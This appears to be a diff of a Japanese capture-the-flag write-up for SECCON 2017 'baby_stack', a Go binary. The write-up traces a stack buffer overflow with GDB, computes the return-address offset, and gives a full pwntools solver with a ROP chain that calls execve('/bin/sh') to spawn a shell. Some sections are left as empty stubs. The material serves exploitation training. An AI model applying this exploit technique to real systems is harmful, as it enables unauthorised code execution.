@@ -34,12 +34,12 @@ mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ checksec baby_stack-7b078c99bb96de6e5ef
 ** 方針
 この問題では、実行ファイルのみ配布され、問題のソースコードが配布されていない。
 このため、問題を解くために以下の手順で脆弱性の調査を行う。
-1. 配布された実行ファイルを動作させ、脆弱性を特定
+1. 配布された実行ファイルを動作させ、プログラムの脆弱性を特定
 2. 特定した脆弱性を利用してシェルの起動
 
-** 1. 配布された実行ファイルの動的解析
+** 1. 配布された実行ファイルの脆弱性の特定
 *** 実行ファイルの動作の確認   
-   とりあえず、配布された実行ファイル (以降実行ファイル)の動作がわからない限り何もわからないので、早速実行してみる。
+   とりあえず、配布された実行ファイルの動作がわからない限り何もわからないので、早速実行してみる。
    #+begin_example
 mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 
 Please tell me your name >> hoge
@@ -82,6 +82,7 @@ main.main()
    とりあえず、何も考えずに大量の文字列を入力したところ、プログラムがエラーを出力し終了した。
    ここで、出力されたエラーを見てみると、 ~0x6262626262626262~ のような記述が多く見られる。
    ~0x62~ はASCIIコードで ~'b'~ を表わすことから、2回目の入力においてスタックバッファオーバフローが発生していると予想できる。
+   また、ここでエラーコードから、問題のプログラムはGo言語で書かれていたこともわかる。
 
 *** GDBを用いた動的解析
     それでは、だいたいの実行ファイルの動きと脆弱性の存在する箇所の検討がついたことから、GDBを用いて実行ファイルの動きを追ってみる。
@@ -126,68 +127,17 @@ main.main()
     #+end_example
 
     すると、2回目の入力を行う関数は、 ~main.main()~ の ~0x4011e8~ の直前に呼ばれていたことがわかる。
-    そこで、 ~main.main()~ の ~0x4011e8~ から先で呼ばれる処理の中で、スタックバッファオーバフローを引き起こすような処理がないかを確認してみる。
-    
-    以下メモ
-    #+begin_example
-gef➤  x/10i 0x4011e8
-   0x4011e8 <main.main+488>:    mov    rax,QWORD PTR [rsp+0x80]
-   0x4011f0 <main.main+496>:    xor    ebx,ebx
-   0x4011f2 <main.main+498>:    mov    QWORD PTR [rsp+0x98],rbx
-   0x4011fa <main.main+506>:    mov    QWORD PTR [rsp+0xa0],rbx
-   0x401202 <main.main+514>:    lea    rbx,[rsp+0x40]
-   0x401207 <main.main+519>:    mov    QWORD PTR [rsp],rbx
-   0x40120b <main.main+523>:    cmp    rax,0x0
-   0x40120f <main.main+527>:    je     0x401498 <main.main+1176>
-   0x401215 <main.main+533>:    lea    rbx,[rax+0x20]
-   0x401219 <main.main+537>:    lea    rdi,[rsp+0x8]
-gef➤  
-   0x40121e <main.main+542>:    mov    rcx,QWORD PTR [rbx]
-   0x401221 <main.main+545>:    mov    QWORD PTR [rdi],rcx
-   0x401224 <main.main+548>:    mov    rcx,QWORD PTR [rbx+0x8]
-   0x401228 <main.main+552>:    mov    QWORD PTR [rdi+0x8],rcx
-   0x40122c <main.main+556>:    mov    rcx,QWORD PTR [rbx+0x10]
-   0x401230 <main.main+560>:    mov    QWORD PTR [rdi+0x10],rcx
-   0x401234 <main.main+564>:    call   0x43f630 <runtime.slicebytetostring>
-   0x401239 <main.main+569>:    mov    rcx,QWORD PTR [rsp+0x20]
-   0x40123e <main.main+574>:    mov    rax,QWORD PTR [rsp+0x28]
-   0x401243 <main.main+579>:    mov    QWORD PTR [rsp+0xe8],rcx
-gef➤  
-   0x40124b <main.main+587>:    mov    QWORD PTR [rsp+0xf0],rax
-   0x401253 <main.main+595>:    mov    QWORD PTR [rsp+0x98],rcx
-   0x40125b <main.main+603>:    mov    QWORD PTR [rsp+0xa8],rcx
-   0x401263 <main.main+611>:    mov    QWORD PTR [rsp+0xa0],rax
-   0x40126b <main.main+619>:    mov    QWORD PTR [rsp+0xb0],rax
-   0x401273 <main.main+627>:    mov    rax,QWORD PTR [rsp+0xb0]
-   0x40127b <main.main+635>:    lea    rbx,[rsp+0x128]
-   0x401283 <main.main+643>:    mov    rbp,QWORD PTR [rbx]
-   0x401286 <main.main+646>:    mov    QWORD PTR [rsp],rbp
-   0x40128a <main.main+650>:    lea    rbx,[rsp+0xa8]
-gef➤  
-   0x401292 <main.main+658>:    mov    rbp,QWORD PTR [rbx]
-   0x401295 <main.main+661>:    mov    QWORD PTR [rsp+0x8],rbp
-   0x40129a <main.main+666>:    mov    QWORD PTR [rsp+0x10],rax
-   0x40129f <main.main+671>:    call   0x4014f0 <main.memcpy>
-   0x4012a4 <main.main+676>:    mov    rbx,QWORD PTR [rsp+0xc8]
-   0x4012ac <main.main+684>:    mov    QWORD PTR [rsp+0x118],rbx
-   0x4012b4 <main.main+692>:    mov    rbx,QWORD PTR [rsp+0xd0]
-   0x4012bc <main.main+700>:    mov    QWORD PTR [rsp+0x120],rbx
-   0x4012c4 <main.main+708>:    mov    QWORD PTR [rsp],0x0
-   0x4012cc <main.main+716>:    mov    rbx,QWORD PTR [rsp+0x128]
-gef➤  
-   0x4012d4 <main.main+724>:    mov    QWORD PTR [rsp+0x8],rbx
-   0x4012d9 <main.main+729>:    mov    rbx,QWORD PTR [rsp+0x130]
-   0x4012e1 <main.main+737>:    mov    QWORD PTR [rsp+0x10],rbx
-   0x4012e6 <main.main+742>:    mov    rbx,QWORD PTR [rsp+0x138]
-   0x4012ee <main.main+750>:    mov    QWORD PTR [rsp+0x18],rbx
-   0x4012f3 <main.main+755>:    call   0x43f630 <runtime.slicebytetostring>
+    そこで、 ~main.main()~ の ~0x4011e8~ から先で呼ばれる処理の中で、スタックバッファオーバフローを引き起こすような処理がないか確認してみる。
 
-    #+end_example
+    すると、 ~0x40129f~ において、 ~main.memcpy~ という関数が呼ばれていることがわかる。
+ #+begin_example
+...    
+0x40129f <main.main+671>:    call   0x4014f0 <main.memcpy>
+...
+ #+end_example
+    いかにもメモリコピーを担当していそうな関数名であるため、この関数について調べてみる。
 
-    すると、 ~0x40129f~ において、 ~main.memcpy~ という関数が呼ばれており、この関数内で何かしらの脆弱性に関する操作が行われていると考えられる。
-    そこで、 ~main.memcpy~ の処理をGDBを用いて追うことで、処理内容を確認してみる。
-
-     ~main.memcpy~ が呼び出されたときのスタックの状態を確認する。
+    まず、 ~main.memcpy~ が呼び出されたときのスタックの状態を確認してみる。
      #+begin_example
 gef➤  dereference
 0x000000c820051d48│+0x0000: 0x00000000004012a4  →  <main.main+676> mov rbx, QWORD PTR [rsp+0xc8]   ← $rsp
@@ -257,22 +207,94 @@ gef➤
 ...
      #+end_example
 
-     ここまでの調査で、スタックバッファオーバフローが発生する箇所を特定できた。
-     次に、この脆弱性を用いてどのようにして任意のアドレスに飛ばすか考える。
+     ここまでの調査で、2回目の入力において、 ~main.memcpy~ 内でスタックバッファオーバフローが発生することが特定できた。
+     次に、この脆弱性を用いてどのようにしてシェルを起動するか考えていく。
 
-     ここで、スタックの続きを見てみると、 ~rsp + 0x148~ にあたるアドレスに、リターンアドレスが格納されていることがわかる。
+** 2. 脆弱性を利用したシェルの起動
+*** RIPの奪取   
+    まず、シェルを起動するために、RIPを奪う必要がある。
+    また、配布された実行プログラムは、事前調査からSSPが無効なことがわかっている。
+    そこで、先程見つけたスタックバッファオーバフローの脆弱性を用いて ~main.main~ のリターンアドレスを書き換えられないかを調査してみる。
 
-     #+begin_example
-...     
-0x000000c820051e90│+0x0140: 0x0000000000000000
-0x000000c820051e98│+0x0148: 0x000000000040ea82  →  <runtime.newobject+66> mov rbx, QWORD PTR [rsp+0x18] <- 後にRIPに格納される値
+    まず、 ~main.main~ のリターンアドレスがスタックのどこに格納されているのかわからないため、 ~main.main~ が呼び出し直後のスタックの状態を確認してみる。
+    #+begin_example
+gef➤  dereference
+0x000000c820051f48│+0x0000: 0x0000000000429ef0  →  <runtime.main+688> mov ebx, DWORD PTR [rip+0x1903c2]        # 0x5ba2b8 <runtime.panicking>      ← $rsp
 ...
-     #+end_example
-     そこで、このアドレスを書き換えることにより、任意のアドレスへのジャンプを行う。
+    #+end_example
+すると、スタックの先頭に、 ~main.main~ のリターンアドレスが積まれていることを確認できる。
 
-     次に、RIPの書き換えを行ったのち、シェルを起動する方法を考える。
+次に、このリターンアドレスを書き換えるために、オーバフローが発生する領域からリターンアドレスまでのオフセットを計算する。
+前節から、スタックの ~0x000000c820051db0~ から入力文字列が格納されることがわかっている。
+このため、これらの差分を計算すると、 ~0x198~ バイトであることがわかる。
+これより、 ~0x198~ バイトの文字列を入力し、その後にアドレスを格納することで、リターンアドレスを書き換えることができると考えられる。
 
+そこで、早速 ~0x198~ バイトの文字列 + ~8~ バイトの文字列(リターンアドレス)を入力し、GDBで先程リターンアドレスが格納されていたアドレスを確認してみる。
+1行目では、 ~main.memcpy~ 呼び出し後のアドレス ( ~0x4012a4~ )にブレークポイントを打っている。
 
+#+begin_example
+gef➤  b *0x4012a4
+gef➤  g
+[New LWP 53720]
+[New LWP 53721]
+[New LWP 53722]
+[New LWP 53723]
+Please tell me your name >> hoge
+Give me your message >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+gef➤  dereference
+...
+0x000000c820051f30│+0x01e0: "aaaaaaaaaaaaaaaaaaaaaaaabbbb"
+0x000000c820051f38│+0x01e8: "aaaaaaaaaaaaaaaabbbb"
+0x000000c820051f40│+0x01f0: "aaaaaaaabbbb"
+0x000000c820051f48│+0x01f8: 0x0000000062626262 ("bbbb"?)
+...
+#+end_example
+
+実行結果を見てみると、先程リターンアドレスが格納されていた ~0x000000c820051f48~ の内容を ~0x62626262~ ( ~bbbb~ )に書き換えできていることがわかる。
+しかし、 ~main.main~ のリターンアドレスへジャンプする前に、プログラムが以下のようなエラーを出力し終了してしまう。
+#+begin_example
+runtime: out of memory: cannot allocate 7016996765293477888-byte block (1048576 in use)
+fatal error: out of memory
+
+runtime stack:
+runtime.throw(0x50c400, 0xd)
+        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
+runtime.largeAlloc(0x6161616161616161, 0x3, 0x0)
+        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
+runtime.mallocgc.func3()
+        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
+runtime.systemstack(0x5a0300)
+        /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
+runtime.mstart()
+        /usr/lib/go-1.6/src/runtime/proc.go:1051
+
+goroutine 1 [running]:
+runtime.systemstack_switch()
+        /usr/lib/go-1.6/src/runtime/asm_amd64.s:245 fp=0xc820051b60 sp=0xc820051b58
+runtime.mallocgc(0x6161616161616161, 0x0, 0xc800000003, 0xc8200a4000)
+        /usr/lib/go-1.6/src/runtime/malloc.go:665 +0x9eb fp=0xc820051c38 sp=0xc820051b60
+runtime.rawstring(0x6161616161616161, 0x0, 0x0, 0x0, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:284 +0x70 fp=0xc820051c80 sp=0xc820051c38
+runtime.rawstringtmp(0x0, 0x6161616161616161, 0x0, 0x0, 0x0, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:111 +0xb7 fp=0xc820051cb8 sp=0xc820051c80
+runtime.slicebytetostring(0x0, 0x6161616161616161, 0x6161616161616161, 0x6161616161616161, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:93 +0x6f fp=0xc820051d50 sp=0xc820051cb8
+main.main()
+        /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x2f8 fp=0xc820051f50 sp=0xc820051d50
+[LWP 53723 exited]
+[LWP 53722 exited]
+[LWP 53721 exited]
+[LWP 53720 exited]
+[Inferior 1 (process 53719) exited with code 02]
+#+end_example
+
+そこで、次に、このエラーを回避する方法を考える。
+
+*** エラーの回避
+    出力されたエラーの内容を確認しただけでは、スタックのどの領域がエラーの原因であるかわからない。
+    そこで、patternを利用し、エラー出力から原因となるスタックの領域を特定する。
+
+    まず、 ~0x200~ バイトのpatternを作成する。
      #+begin_example
 gef➤  pattern create 0x200
 [+] Generating a pattern of 512 bytes (n=8)
@@ -280,6 +302,7 @@ aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
 [+] Saved as '$_gef0'
      #+end_example
 
+     次に、このpatternを入力し、再度エラーを出力させる。
      #+begin_example
 gef➤
 runtime: out of memory: cannot allocate 7089054359331405824-byte block (1048576 in use)
@@ -310,10 +333,7 @@ runtime.slicebytetostring(0x0, 0x626161616161617a, 0x6261616161616162, 0x6261616
         /usr/lib/go-1.6/src/runtime/string.go:93 +0x6f fp=0xc820051d50 sp=0xc820051cb8
 main.main()
         /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x2f8 fp=0xc820051f50 sp=0xc820051d50
-[LWP 38643 exited]
-[LWP 38642 exited]
-[LWP 38641 exited]
-[LWP 38640 exited]
+...
 [Inferior 1 (process 38636) exited with code 02]
      #+end_example
 
@@ -333,91 +353,205 @@ gef➤  pattern search 0x626161616161617a
 [+] Found at offset 200 (little-endian search) likely
      #+end_example
      すると、これらのオフセットは208(0xd0)番目、216(0xd8)番目、200(0xc8)番目にあたることがわかる。
-     そこで、エラーの原因と考えられる箇所には、bss領域のアドレスが格納されるようにしておく。
+
+     また、スタックバッファオーバフローが発生しない入力をした場合のスタックの状態を見ることで、何故ここでエラーが発生したのか考えてみる。
+     #+begin_example
+gef➤  g
+Please tell me your name >> hoge
+Give me your message >> fuga
+gef➤ dereference
+...
+0x000000c820051e78│+0x0128: 0x000000c820051db0  →  0x0000000061677566 ("fuga"?)
+0x000000c820051e80│+0x0130: 0x0000000000000020 (" "?)
+0x000000c820051e88│+0x0138: 0x0000000000000020 (" "?)
+...
+     #+end_example
+     上記の入力を行い、 ~main.memcpy~ 終了後のスタックの状態を見てみると、
+     先程エラーが出力された原因と考えられる場所には、2回目の入力の格納先のアドレスと格納先のサイズと思われる ~0x20(32)~ が格納されている。
+
+     このため、 ~0xc8~ には何らかの文字列のアドレス、 ~0xd0~ と ~0xd8~ には文字列のサイズを格納すれば良いと推測できる。
+     そこで、実行ファイル中に存在する文字列である ~"Please"~ を代わりの文字列として使用する。
+     先程まで利用していたpatternに、上記の値を格納して、再度プログラムを実行してみる。
+     #+begin_src python
+       pattern = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac'
+       buf2 = list(pattern)
+
+       # name
+       buf2[0x68:0x70] = p64(please_ptr) # string ptr
+       buf2[0x70:0x78] = p64(0x6)        # string size
+
+       # msg
+       buf2[0xc8:0xd0] = p64(please_ptr) # string ptr
+       buf2[0xd0:0xd8] = p64(0x6)        # string size
+       buf2[0xd0:0xd8] = p64(0x6)        # string size
+
+       buf2 = buf2[:0x1f8-0x60]
+       buf2 = bytes(buf2)
+     #+end_src
      
-** 2. 配布された実行ファイルの静的解析
+     すると、今度は以下のようなエラーが出力される。
+     #+begin_example
+Please tell me your name >> Give me your message >> fatal error: runtime: internal error:
+misuse of lockOSThread/unlockOSThread
 
-** solver
+...
+
+goroutine 1 [[*] Process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8' stopped with exit code 2 (pid 54788)
+running]:
+runtime.systemstack_switch()
+    /usr/lib/go-1.6/src/runtime/asm_amd64.s:245 fp=0xc820051480 sp=0xc820051478
+runtime.unlockOSThread()
+    /usr/lib/go-1.6/src/runtime/proc.go:2929 +0x31 fp=0xc820051498 sp=0xc820051480
+runtime.main.func2(0xc820051f87)
+    /usr/lib/go-1.6/src/runtime/proc.go:146 +0x21 fp=0xc8200514a0 sp=0xc820051498
+runtime.call32(0x0, 0x537758, 0xc820016170, 0x800000008)
+    /usr/lib/go-1.6/src/runtime/asm_amd64.s:472 +0x3e fp=0xc8200514c8 sp=0xc8200514a0
+panic(0x4e4800, 0xc82000a3c0)
+    /usr/lib/go-1.6/src/runtime/panic.go:443 +0x4e9 fp=0xc820051548 sp=0xc8200514c8
+runtime.growslice(0x4c2000, 0xc8200104c0, 0xb, 0x20, 0x616161616161617a, 0x0, 0x0, 0x0)
+    /usr/lib/go-1.6/src/runtime/slice.go:53 +0xd3 fp=0xc8200515b8 sp=0xc820051548
+runtime.growslice_n(0x4c2000, 0xc8200104c0, 0xb, 0x20, 0x616161616161615a, 0x0, 0x0, 0x0)
+    /usr/lib/go-1.6/src/runtime/slice.go:44 +0xc7 fp=0xc820051610 sp=0xc8200515b8
+fmt.(*fmt).padString(0xc82007ee28, 0x616161616161616e, 0x616161616161616f)
+    /usr/lib/go-1.6/src/fmt/format.go:130 +0x406 fp=0xc820051730 sp=0xc820051610
+fmt.(*fmt).fmt_s(0xc82007ee28, 0x616161616161616e, 0x616161616161616f)
+    /usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc820051760 sp=0xc820051730
+fmt.(*pp).fmtString(0xc82007edd0, 0x616161616161616e, 0x616161616161616f, 0xc800000073)
+    /usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc820051790 sp=0xc820051760
+fmt.(*pp).printArg(0xc82007edd0, 0x4c1c00, 0xc82000a3a0, 0x73, 0x0, 0x0)
+    /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc820051918 sp=0xc820051790
+fmt.(*pp).doPrintf(0xc82007edd0, 0x5220a0, 0x18, 0xc820051ea8, 0x2, 0x2)
+    /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc820051ca0 sp=0xc820051918
+fmt.Fprintf(0x7f4960ce11e8, 0xc82003e010, 0x5220a0, 0x18, 0xc820051ea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)
+    /usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc820051ce8 sp=0xc820051ca0
+fmt.Printf(0x5220a0, 0x18, 0xc820051ea8, 0x2, 0x2, 0x6, 0x0, 0x0)
+    /usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc820051d50 sp=0xc820051ce8
+main.main()
+    /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc820051f50 sp=0xc820051d50
+runtime.isExportedRuntime(0x46defd, 0x0, 0x4016ea)
+    /usr/lib/go-1.6/src/runtime/traceback.go:638 +0xb5 fp=0xc820051f90 sp=0xc820051f50
+     #+end_example
+
+     エラーを見ると、 ~fmt.Printf~ が原因となっていることがわかる。
+     また、patternが出力されている ~0x616161616161616e~ と ~0x616161616161616f~ に対応するスタックの領域がエラー箇所であると推測できる。
+
+     そこで、先程と同様に、これらのpatternのオフセットを求める。
+     #+begin_example
+gef➤  pattern search 0x616161616161616e
+[+] Searching for '0x616161616161616e'
+[+] Found at offset 104 (little-endian search) likely
+[+] Found at offset 97 (big-endian search)
+gef➤  pattern search 0x616161616161616f
+[+] Searching for '0x616161616161616f'
+[+] Found at offset 112 (little-endian search) likely
+[+] Found at offset 105 (big-endian search)
+     #+end_example
+
+     この結果から、 ~104(0x68)~ 番目と ~0x112(0x70)~ 番目のオフセットに対応する箇所がエラーの原因であると予想できる。
+     ここで、先程と同様にスタックバッファオーバフローが発生しない入力をした際のものと比較してみる。
+     #+begin_example
+Please tell me your name >> hoge
+Give me your message >> fuga
+gef➤ dereference
+...
+0x000000c82004be18│+0x00c8: 0x000000c82000a2e4  →  0x0000000065676f68 ("hoge"?)
+0x000000c82004be20│+0x00d0: 0x0000000000000004
+...     
+     #+end_example
+
+     すると、こちらについても、 ~0x68~ 番目は1回目の入力が格納される領域のアドレスであり、
+     ~0x70~ 番目は入力した文字列のサイズであると推測できる。
+     このため、先程と同様に ~"Please"~ の文字列を指すようにそれぞれ値を格納し、再度プログラムを実行すると、
+     先程までのエラーを回避し、リターンアドレスを書き換えることができる。
+
+*** シェルの起動
+    
+** solverの作成
+*** ROP
+    rop gadgetについて
+    
+*** solver   
    #+begin_src python
-from pwn import *
+      from pwn import *
 
-filename = './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
-chall = ELF(filename)
+      filename = './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
+      chall = ELF(filename)
 
-# socat TCP-LISTEN:8000,reuseaddr,fork EXEC:"./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8"
-conn = remote('localhost', 8000)
-# conn = process(filename)
+      # socat TCP-LISTEN:8000,reuseaddr,fork EXEC:"./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8"
+      conn = remote('localhost', 8000)
+      # conn = process(filename)
 
-# ROP Gadgets
-bss_addr = 0x000000000058e000
-hoge_str = 0x000000c8200a2000
+      # ROP Gadgets
+      bss_addr = 0x000000000058e000
+      hoge_str = 0x000000c8200a2000
 
-## 0x00000000004026da: syscall;
-syscall = 0x00000000004026da
+      ## 0x00000000004026da: syscall;
+      syscall = 0x00000000004026da
 
-## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;
-pop_rdi = 0x0000000000470931
+      ## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;
+      pop_rdi = 0x0000000000470931
 
-## 0x0000000000456499: mov qword ptr [rdi], rax; ret;
-mov_rdi_rax = 0x0000000000456499
+      ## 0x0000000000456499: mov qword ptr [rdi], rax; ret;
+      mov_rdi_rax = 0x0000000000456499
 
-## 0x000000000046defd: pop rsi; ret;
-pop_rsi = 0x000000000046defd
+      ## 0x000000000046defd: pop rsi; ret;
+      pop_rsi = 0x000000000046defd
 
-## 0x00000000004016ea: pop rax; ret;
-pop_rax = 0x00000000004016ea
+      ## 0x00000000004016ea: pop rax; ret;
+      pop_rax = 0x00000000004016ea
 
-## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;
-pop_rdx = 0x0000000000448145
+      ## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;
+      pop_rdx = 0x0000000000448145
 
-## static string
-please_ptr = 0x521f00
-please_size = 0x6
+      ## static string
+      please_ptr = 0x521f00
+      please_size = 0x6
 
-# Input name (First input)
-buf1 = b"hoge"
-conn.sendline(buf1)
+      # Input name (First input)
+      buf1 = b"hoge"
+      conn.sendline(buf1)
 
-# Inpu msg (Second input)
-## recover name
-buf2 = b'a'*0x68
-buf2 += p64(please_ptr)
-buf2 += p64(please_size)
+      # Input msg (Second input)
+      ## name string
+      buf2 = b'a'*0x68
+      buf2 += p64(please_ptr)
+      buf2 += p64(please_size)
 
-## recover msg
-buf2 += b'a'*(0xc8-len(buf2))
-buf2 += p64(please_ptr)
-buf2 += p64(please_size)
+      ## msg string
+      buf2 += b'a'*(0xc8-len(buf2))
+      buf2 += p64(please_ptr)
+      buf2 += p64(please_size)
+      buf2 += p64(please_size)
 
-buf2 += b'a'*(0x198-len(buf2))
+      buf2 += b'a'*(0x198-len(buf2))
 
-# ROP
-## rdx = 0
-buf2 += p64(pop_rdx)
-buf2 += p64(0x0)
-buf2 += b'a'*0x38
+      # ROP
+      ## rdx = 0
+      buf2 += p64(pop_rdx)
+      buf2 += p64(0x0)
+      buf2 += b'a'*0x38
 
-## rsi = 0
-buf2 += p64(pop_rsi)
-buf2 += p64(0x0)
+      ## rsi = 0
+      buf2 += p64(pop_rsi)
+      buf2 += p64(0x0)
 
-## rdi = "/bin/sh"
-buf2 += p64(pop_rax)
-buf2 += p64(bss_addr) # initialize rax with bss_addr
-buf2 += p64(pop_rdi)
-buf2 += p64(bss_addr)
-buf2 += p64(pop_rax)
-buf2 += b"/bin/sh\x00"
-buf2 += p64(mov_rdi_rax)
+      ## rdi = "/bin/sh"
+      buf2 += p64(pop_rax)
+      buf2 += p64(bss_addr) # initialize rax with bss_addr
+      buf2 += p64(pop_rdi)
+      buf2 += p64(bss_addr)
+      buf2 += p64(pop_rax)
+      buf2 += b"/bin/sh\x00"
+      buf2 += p64(mov_rdi_rax)
 
-## rax = 59
-buf2 += p64(pop_rax)
-buf2 += p64(59)      # execve
+      ## rax = 59
+      buf2 += p64(pop_rax)
+      buf2 += p64(59)      # execve
 
-## execve("/bin/sh", 0, 0)
-buf2 += p64(syscall)
-conn.sendline(buf2)
-conn.interactive()
+      ## execve("/bin/sh", 0, 0)
+      buf2 += p64(syscall)
+      conn.sendline(buf2)
+      conn.interactive()
    #+end_src
    
 *** 実行結果
@@ -440,5 +574,5 @@ $ cat flag.txt
 SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}
    #+end_example
    
-*** ~SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}~
+**** ~SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}~
    
